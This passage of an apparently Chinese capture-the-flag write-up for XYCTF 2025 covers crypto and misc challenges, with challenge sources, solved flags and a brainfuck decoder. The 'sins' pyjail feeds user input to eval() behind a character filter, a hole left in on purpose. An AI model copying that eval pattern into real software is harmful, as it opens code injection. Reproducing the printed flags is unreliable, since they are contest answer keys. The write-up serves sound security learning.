class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, b, seed</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LCG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed, a, b</span>):</span><br><span class="line">        self.seed = seed</span><br><span class="line">        self.a = a</span><br><span class="line">        self.b = b</span><br><span class="line">        self.m = <span class="number">2</span>**<span class="number">128</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        self.seed = (self.seed * self.a + self.b) % self.m</span><br><span class="line">        <span class="keyword">return</span> (self.seed &gt;&gt; <span class="number">64</span>) ^ (self.seed % <span class="number">2</span>**<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">lfsr</span>:</span><br><span class="line">    <span class="comment"># 我被裁了/(ㄒoㄒ)/~~</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">47026247687942121848144207491837523525</span></span><br><span class="line"><span class="keyword">assert</span> b &lt; <span class="number">2</span>**<span class="number">128</span> <span class="keyword">and</span> seed &lt; <span class="number">2</span>**<span class="number">128</span></span><br><span class="line">lcg = LCG(seed, a, b)</span><br><span class="line"><span class="built_in">print</span>([lcg.<span class="built_in">next</span>() <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">0</span>] * <span class="number">64</span>])</span><br><span class="line"><span class="built_in">print</span>(AES.new(key=md5(<span class="built_in">str</span>(seed).encode()).digest(), mode=AES.MODE_ECB).encrypt(pad(flag, <span class="number">16</span>)))</span><br><span class="line"><span class="comment"># [17861431650111939539, 15632044669542972472, 18085804805519111109, 11630394250634164303, 10914687109985225138, 7348450425255618214, 10796029302647050328, 14267824433700366397, 9363967587530173835, 8995382728269798714, 3504283765121786984, 1312349325731613524, 10716889342831891752, 12298317818779713512, 8701992888199838445, 7261196699430834071, 4670657923849978944, 9833942603152121381, 18304734854303383637, 15945503654626665549, 6509330987395005461, 223169047706410182, 12990946817252956584, 3884858487227858459, 6366350447244638553, 10326924732676590049, 12989931141522347344, 9197940263960765675, 2481604167192102429, 1409946688030505107, 9263229900540161832, 266892958530212020, 14298569012977896930, 17318088100106133211, 4224045753426648494, 650161332435727275, 9488449142549049042, 8916910451165068139, 10116136382602356010, 6604992256480748513, 7375827593997920567, 1661095751967623288, 4143230452547340203, 4145435984742575053, 10465207027576409947, 16146447204594626029, 2807803679403346199, 10857432394281592897, 1494771564147200381, 2085795265418108023, 11756240132299985418, 13802520243518071455, 1191829597542202169, 16603089856395516862, 12517247819572559598, 14148806699104849454, 8174845389550768121, 15565523852832475714, 10046639095828632930, 15353735627107824646, 7003433641698461961, 11217699328913391211, 6392630836483027655, 7918524192972397836]</span></span><br><span class="line"><span class="comment"># b&#x27;l\x8bd,\xa3\xe7\x87*\xca\n\xd7\x11\xd6n=\xeaS`\xa4w\x94(\xb9\xf9\xb9\xc6\xe3\xc2\xfb\xdb\x80\xf6\x9f\xc7\xd1F&quot;`&#123;;V\xa7&#125;Z\xc0\xc0\xf6&lt;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="勒索病毒"><a href="#勒索病毒" class="headerlink" title="勒索病毒*"></a>勒索病毒*</h2><blockquote><p>帝皇坤在渗透的时候不小心运行了一个exe文件，然后重要文件被加密了，你能帮帮他吗</p></blockquote><p><code>flag.txt.enc</code>：<code>bf0cb5cc6bea6146e9c1f109df953a57daa416d38a8ffba6438e7e599613e01f3b9a53dace4ccd55cd3e55ef88e0b835</code></p><p>然后是个<strong>可执行程序</strong></p><h2 id="复复复复数"><a href="#复复复复数" class="headerlink" title="复复复复数*"></a>复复复复数*</h2><blockquote><p>天啊，这个复复复复数比我认识中的复数还多出了……？</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ComComplex</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span>):</span><br><span class="line">        self.value = value</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        s = <span class="built_in">str</span>(self.value[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">for</span> k,i <span class="keyword">in</span> <span class="built_in">enumerate</span>(self.value[<span class="number">1</span>:]):</span><br><span class="line">            <span class="keyword">if</span> i &gt;= <span class="number">0</span>:</span><br><span class="line">                s += <span class="string">&#x27;+&#x27;</span></span><br><span class="line">            s += <span class="built_in">str</span>(i) +<span class="string">&#x27;ijk&#x27;</span>[k]</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__add__</span>(<span class="params">self,x</span>):</span><br><span class="line">        <span class="keyword">return</span> ComComplex([i+j <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(self.value,x.value)])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self,x</span>):</span><br><span class="line">        a = self.value[<span class="number">0</span>]*x.value[<span class="number">0</span>]-self.value[<span class="number">1</span>]*x.value[<span class="number">1</span>]-self.value[<span class="number">2</span>]*x.value[<span class="number">2</span>]-self.value[<span class="number">3</span>]*x.value[<span class="number">3</span>]</span><br><span class="line">        b = self.value[<span class="number">0</span>]*x.value[<span class="number">1</span>]+self.value[<span class="number">1</span>]*x.value[<span class="number">0</span>]+self.value[<span class="number">2</span>]*x.value[<span class="number">3</span>]-self.value[<span class="number">3</span>]*x.value[<span class="number">2</span>]</span><br><span class="line">        c = self.value[<span class="number">0</span>]*x.value[<span class="number">2</span>]-self.value[<span class="number">1</span>]*x.value[<span class="number">3</span>]+self.value[<span class="number">2</span>]*x.value[<span class="number">0</span>]+self.value[<span class="number">3</span>]*x.value[<span class="number">1</span>]</span><br><span class="line">        d = self.value[<span class="number">0</span>]*x.value[<span class="number">3</span>]+self.value[<span class="number">1</span>]*x.value[<span class="number">2</span>]-self.value[<span class="number">2</span>]*x.value[<span class="number">1</span>]+self.value[<span class="number">3</span>]*x.value[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> ComComplex([a,b,c,d])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mod__</span>(<span class="params">self,x</span>):</span><br><span class="line">        <span class="keyword">return</span> ComComplex([i % x <span class="keyword">for</span> i <span class="keyword">in</span> self.value])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__pow__</span>(<span class="params">self, x, n=<span class="literal">None</span></span>):</span><br><span class="line">        tmp = ComComplex(self.value)</span><br><span class="line">        a = ComComplex([<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">while</span> x:</span><br><span class="line">            <span class="keyword">if</span> x &amp; <span class="number">1</span>:</span><br><span class="line">                a *= tmp</span><br><span class="line">            tmp *= tmp</span><br><span class="line">            <span class="keyword">if</span> n:</span><br><span class="line">                a %= n</span><br><span class="line">                tmp %= n</span><br><span class="line">            x &gt;&gt;= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, hint</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">q = getPrime(<span class="number">256</span>)</span><br><span class="line">r = getPrime(<span class="number">256</span>)</span><br><span class="line">n = p * q * r</span><br><span class="line"></span><br><span class="line">P = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(hint) == <span class="number">20</span></span><br><span class="line">hints = ComComplex([bytes_to_long(hint[i:i+<span class="number">5</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">20</span>,<span class="number">5</span>)])</span><br><span class="line">keys = ComComplex([<span class="number">0</span>, p, q, r])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hint =&#x27;</span>,hints)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;gift =&#x27;</span>,hints*keys%P)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;P =&#x27;</span>,P)</span><br><span class="line"></span><br><span class="line">e = <span class="number">65547</span></span><br><span class="line">m = ComComplex([bytes_to_long(flag[i:i+<span class="built_in">len</span>(flag)//<span class="number">4</span>+<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(flag),<span class="built_in">len</span>(flag)//<span class="number">4</span>+<span class="number">1</span>)])</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">hint = 375413371936+452903063925i+418564633198j+452841062207k</span></span><br><span class="line"><span class="string">gift = 8123312244520119413231609191866976836916616973013918670932199631084038015924368317077919454611785179950870055560079987034735836668109705445946887481003729+20508867471664499348708768798854433383217801696267611753941328714877299161068885700412171i+22802458968832151777449744120185122420871929971817937643641589637402679927558503881707868j+40224499597522456323122179021760594618350780974297095023316834212332206526399536884102863k</span></span><br><span class="line"><span class="string">P = 8123312244520119413231609191866976836916616973013918670932199631182724263362174895104545305364960781233690810077210539091362134310623408173268475389315109</span></span><br><span class="line"><span class="string">n = 408713495380933615345467409596399184629824932933932227692519320046890365817329617301604051766392980053993030281090124694858194866782889226223493799859404283664530068697313752856923001112586828837146686963124061670340088332769524367</span></span><br><span class="line"><span class="string">c = 212391106108596254648968182832931369624606731443797421732310126161911908195602305474921714075911012622738456373731638115041135121458776339519085497285769160263024788009541257401354037620169924991531279387552806754098200127027800103+24398526281840329222660628769015610312084745844610670698920371305353888694519135578269023873988641161449924124665731242993290561874625654977013162008430854786349580090169988458393820787665342793716311005178101342140536536153873825i+45426319565874516841189981758358042952736832934179778483602503215353130229731883231784466068253520728052302138781204883495827539943655851877172681021818282251414044916889460602783324944030929987991059211909160860125047647337380125j+96704582331728201332157222706704482771142627223521415975953255983058954606417974983056516338287792260492498273014507582247155218239742778886055575426154960475637748339582574453542182586573424942835640846567809581805953259331957385k</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p>后续这三题怕是不好复现了……</p><ul><li><a href="https://blog.weyung.cc/2025/04/04/2025%20XYCTF/#Crypto">未央师傅</a></li></ul><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="XGCTF"><a href="#XGCTF" class="headerlink" title="XGCTF"></a>XGCTF</h2><blockquote><p>2024年CTFshow举办了一场名为“西瓜杯”的比赛（XGCTF）。其中LamentXU在出题的时候，从某场比赛拉了道原题下来改了改，结果传文件的时候传错了传成原题了。因为这件事LamentXU的损友dragonkeep在他之前的博客上的原题wp上加了一段flag来嘲笑LamentXU。请你找到XGCTF中唯一由LamentXU出的题，并找出这题对应的原题，接着找到dragonkeep师傅的博客，并从博客上讲解该题的博文中找到flag。（hint：dragonkeep师傅因为比较穷买不起域名，因此他博客的域名在dragonkeep的基础上多了个字母）<br>（出题人：LamentXU）</p></blockquote><p>可以去<code>ctfshow</code>直接找<code>XGCTF</code>，看出题人出了哪道题目<br>然后，找<code>dragonkeep</code>师傅的博客，过程不细说，懂的自然懂，直接放<a href="https://dragonkeeep.top/category/CISCN%E5%8D%8E%E4%B8%9C%E5%8D%97WEB-Polluted">结果</a><br><img src="https://pic1.zhimg.com/80/v2-ba5e147c9715d7bf3e8e933b0510bdcb_1440w.png" alt=""><br><code>flag&#123;1t_I3_t3E_s@Me_ChAl1eNge_aT_a1L_P1e@se_fOrg1ve_Me&#125;</code></p><h2 id="签个到吧"><a href="#签个到吧" class="headerlink" title="签个到吧"></a>签个到吧</h2><blockquote><p>最小的，具有图灵完备性的语言是？</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">&gt;+++++++++++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;++++++++++++[&lt;+++++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;++++++++++++[&lt;+++++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++[&lt;++++&gt;-+-+-+-]&lt;[-]&gt;++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++[&lt;++++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;++++++++++++[&lt;+++++++&gt;-+-+-+-]&lt;[-]&gt;++++++++++[&lt;+++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++[&lt;++++++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;++&gt;-+-+-+-]&lt;[-]&gt;++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++[&lt;+++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++[&lt;++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]</span><br></pre></td></tr></table></figure><p><code>brainfuck</code>，但很遗憾解不出来，没关系交给<code>AI</code>，很高兴<code>AI</code>利用它强大的分析能力，分析出<code>flag</code>的形式了，即<code>&gt;</code>到<code>[</code>之间的<strong>加号数量</strong>乘上<code>&lt;&gt;</code>之间的<strong>加号数量</strong>就是<code>flag</code>的<strong>ASCII值</strong>(本质原理确实如此)，还是要拷打它要个脚本，因为统计的太拉了。。。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decode_bf_string</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read().strip()</span><br><span class="line"></span><br><span class="line">    pos = <span class="number">0</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> pos &lt; <span class="built_in">len</span>(data):</span><br><span class="line">        <span class="comment"># 查找第一个 &quot;&gt;&quot; 字符</span></span><br><span class="line">        idx_gt = data.find(<span class="string">&quot;&gt;&quot;</span>, pos)</span><br><span class="line">        <span class="keyword">if</span> idx_gt == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 从 &quot;&gt;&quot; 后计数连续的 &quot;+&quot;</span></span><br><span class="line">        idx = idx_gt + <span class="number">1</span></span><br><span class="line">        count_out = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> idx &lt; <span class="built_in">len</span>(data) <span class="keyword">and</span> data[idx] == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">            count_out += <span class="number">1</span></span><br><span class="line">            idx += <span class="number">1</span></span><br><span class="line">        <span class="comment"># 若没有遇到 &quot;[&quot;，则说明解析结束</span></span><br><span class="line">        <span class="keyword">if</span> idx &gt;= <span class="built_in">len</span>(data) <span class="keyword">or</span> data[idx] != <span class="string">&quot;[&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 从 &quot;[&quot; 后查找第一个 &quot;&lt;&quot;</span></span><br><span class="line">        idx_bracket = data.find(<span class="string">&quot;&lt;&quot;</span>, idx)</span><br><span class="line">        <span class="keyword">if</span> idx_bracket == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 从 &quot;&lt;&quot; 后计数连续的 &quot;+&quot;</span></span><br><span class="line">        idx = idx_bracket + <span class="number">1</span></span><br><span class="line">        count_in = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> idx &lt; <span class="built_in">len</span>(data) <span class="keyword">and</span> data[idx] == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">            count_in += <span class="number">1</span></span><br><span class="line">            idx += <span class="number">1</span></span><br><span class="line">        <span class="comment"># 若没有遇到 &quot;&gt;&quot; 则跳出</span></span><br><span class="line">        <span class="keyword">if</span> idx &gt;= <span class="built_in">len</span>(data) <span class="keyword">or</span> data[idx] != <span class="string">&quot;&gt;&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 计算乘积并转换为字符</span></span><br><span class="line">        product = count_out * count_in</span><br><span class="line">        result += <span class="built_in">chr</span>(product)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 更新 pos 到刚刚匹配完的 &quot;&gt;&quot; 之后，继续下一段</span></span><br><span class="line">        pos = idx + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    filename = <span class="string">&quot;C:\\Users\\27920\\Desktop\\bf.txt&quot;</span></span><br><span class="line">    decoded = decode_bf_string(filename)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密结果:&quot;</span>, decoded)</span><br></pre></td></tr></table></figure><p><code>flag&#123;W3lC0me_t0_XYCTF_2025_Enj07_1t!&#125;</code></p><p>题目这里只是缺乏输出，我们只需要使用<code>.</code>即可(难道你没发现少了这个东西吗)<br>全部的<code>&lt;[</code>替换为<code>&lt;.[</code>即可</p><h2 id="曼波曼波曼波"><a href="#曼波曼波曼波" class="headerlink" title="曼波曼波曼波"></a>曼波曼波曼波</h2><p>给了一张假<code>flag</code>的二维码，然后<code>smn.txt</code>很明显是<strong>倒序的base64</strong>，把图像下载下来发现<strong>jpg图片尾</strong>有<strong>压缩包</strong>，导出，压缩包密码盲猜<code>XYCTF2025</code>，然后得到两张<strong>看似一样</strong>的照片，直接上<strong>双图盲水印</strong><br><img src="https://pica.zhimg.com/80/v2-b467d0602066750608d0c1fbdc382e36_1440w.png" alt=""><br><img src="https://picx.zhimg.com/80/v2-202a1c786a9ac0b51a77671bcd5aa5cc_1440w.png" alt=""><br><code>XYCTF&#123;easy_yin_xie_dfbfuj877&#125;</code></p><h2 id="MADer也要当CTFer"><a href="#MADer也要当CTFer" class="headerlink" title="MADer也要当CTFer*"></a>MADer也要当CTFer*</h2><blockquote><p>你知道PRTShark是什么意思吗，P是位置，R是旋转，T是不透明度，S是缩放，而hark代表这道题是hard to hack吧</p></blockquote><p>蚝康，这题需要使用到<code>AE</code>，一款图形视频处理软件，那还是蹲个<code>wp</code>观摩一下吧</p><h2 id="会飞的雷克萨斯"><a href="#会飞的雷克萨斯" class="headerlink" title="会飞的雷克萨斯*"></a>会飞的雷克萨斯*</h2><blockquote><p>2025年1月30日W1ndys上网冲浪时，收到了舍友发来的聊天记录，聊天记录显示，一小孩放鞭炮引爆地面，请定位爆炸点的具体位置，该题解出需要通过正常的osint题目做题思路</p></blockquote><p>好，是社工，笑死，不玩(狗头)</p><h2 id="Greedymen"><a href="#Greedymen" class="headerlink" title="Greedymen*"></a>Greedymen*</h2><blockquote><p>Isn’t it ironic? Greed isn’t limited. Freedom is a limited resource.</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">nc <span class="number">8.147</span><span class="number">.132</span><span class="number">.32</span> <span class="number">17479</span></span><br><span class="line">Welcome to the Greedy Game</span><br><span class="line">Your goal <span class="keyword">is</span> to be <span class="keyword">as</span> greedy <span class="keyword">as</span> possible</span><br><span class="line"><span class="number">1.</span>Play</span><br><span class="line"><span class="number">2.</span>Rules</span><br><span class="line"><span class="number">3.</span>Quit</span><br><span class="line"><span class="number">2</span></span><br><span class="line">There are <span class="number">3</span> levels, level <span class="number">1</span>/<span class="number">2</span>/<span class="number">3</span> has number <span class="number">1</span> to <span class="number">50</span>/<span class="number">100</span>/<span class="number">200</span> on board to choose <span class="keyword">from</span></span><br><span class="line">Each number you choose, you get the corresponding points</span><br><span class="line">However, your opponent will choose <span class="built_in">all</span> the factors of the number you choose, <span class="keyword">and</span> get the points of each factor</span><br><span class="line">You can <span class="keyword">not</span> choose numbers that are already assigned to a player</span><br><span class="line">You are only allow to choose the number <span class="keyword">if</span> it has at least one factor <span class="keyword">not</span> choosen</span><br><span class="line">If you can<span class="string">&#x27;t choose anymore, the rest of the board goes to your opponent</span></span><br><span class="line"><span class="string">To make the challenge harder, there is a counter that starts with 19/37/76 in level 1/2/3, each time you choose a number, the counter decreases by 1</span></span><br><span class="line"><span class="string">When it reaches 0, and the game will end, and the unassigned numbers will go to your opponent</span></span><br><span class="line"><span class="string">The challenge is always solvable</span></span><br><span class="line"><span class="string">Player with highest score wins</span></span><br><span class="line"><span class="string">Good Luck!</span></span><br><span class="line"><span class="string">1.Play</span></span><br><span class="line"><span class="string">2.Rules</span></span><br><span class="line"><span class="string">3.Quit</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">Level 1/3 50 Numbers</span></span><br><span class="line"><span class="string">Unassigned Numbers: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50]</span></span><br><span class="line"><span class="string">Counter: 19</span></span><br><span class="line"><span class="string">Your Score: 0</span></span><br><span class="line"><span class="string">Opponent Score: 0</span></span><br><span class="line"><span class="string">Choose a Number:49</span></span><br><span class="line"><span class="string">Unassigned Numbers: [2, 3, 4, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 50]</span></span><br><span class="line"><span class="string">Counter: 18</span></span><br><span class="line"><span class="string">Your Score: 49</span></span><br><span class="line"><span class="string">Opponent Score: 8</span></span><br><span class="line"><span class="string">Choose a Number:</span></span><br></pre></td></tr></table></figure><p>肥肠好玩的一个游戏</p><h2 id="sins"><a href="#sins" class="headerlink" title="sins*"></a>sins*</h2><blockquote><p>“Come now, let us settle the matter,” says the LORD. “Though your sins are like scarlet, they shall be as white as snow; though they are red as crimson, they shall be like wool. - Isaiah 1:18</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;For there are three that bear record in heaven, the Father, the Word, and the Holy Ghost&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;But here we have four cases bearing witness&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">i_pow</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n % <span class="number">4</span> == <span class="number">0</span>: <span class="comment"># as the 40 days of flood</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> n % <span class="number">4</span> == <span class="number">1</span>: <span class="comment"># as the 1 true God</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;i&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> n % <span class="number">4</span> == <span class="number">2</span>: <span class="comment"># as the 2 tablets of stone</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;-1&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> n % <span class="number">4</span> == <span class="number">3</span>: <span class="comment"># as the 3 days in the tomb</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;-i&#x27;</span></span><br><span class="line"></span><br><span class="line">inp = <span class="built_in">input</span>(<span class="string">&quot;wash away your sins: &quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>(i <span class="keyword">in</span> <span class="string">&quot;i0123456789+-*%/^=&lt;&gt;~&amp;|:()[]&#x27;&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> inp), <span class="string">&quot;invalid char&quot;</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(inp) &lt; <span class="number">16</span>, <span class="string">&quot;too long&quot;</span></span><br><span class="line">R = <span class="built_in">eval</span>(<span class="string">f&quot;lambda i: <span class="subst">&#123;inp&#125;</span>&quot;</span>, &#123;&#125;, &#123;&#125;)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>(R(i) == i_pow(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>.from_bytes(<span class="string">b&#x27;The_adwa_shall_forgive_thee&#x27;</span>) // <span class="number">2</span>**<span class="number">195</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="Lament-Jail"><a href="#Lament-Jail" class="headerlink" title="Lament Jail*"></a>Lament Jail*</h2><blockquote><p>异想体编号：H-██████ ；异想体名称：flag；安全等级：优；状态：该异想体已突破收容。描述：该异想体本质上为一段”flag{“开头”}”结尾的字符串。它极度胆怯，害怕人类不同等级的观察。该异想体经常突破收容。他的内容是██████████████████████████；收容条件：flag被收容在一个对公网开放的主机（flag-1，又名Lament Jail）上的/flag文件里。该主机上运行有能够让人们完全控制主机的服务（使用套接字进行远控），便于观测异想体状态；事件经过：事件编号████████████████。████年██月███日，由于工作人员██████████████的失误，flag被赋予高权限。它成功突破了收容。flag目前被观测到改写了人们控制它的服务。在这之上做了一些加密措施，并限制了远程代码的执行。这使得我们极难观测该异想体。同时，它摆脱了文件/flag的限制，逃到了█████████████。所幸，我们在主机上留下了/bin/rf，它可以直接从███████████████读取flag。同时，员工█████████████通过某种手段取回了正在运行的服务的源码。请你连接并突破该异想体在Lament Jail上做的限制，控制这台主机，找回flag。</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @FileName  :Lament_Jail.py</span></span><br><span class="line"><span class="comment"># @Time      :2025/3/22 12:37:43</span></span><br><span class="line"><span class="comment"># @Author    :LamentXU</span></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> remove</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES, PKCS1_OAEP</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> zlib <span 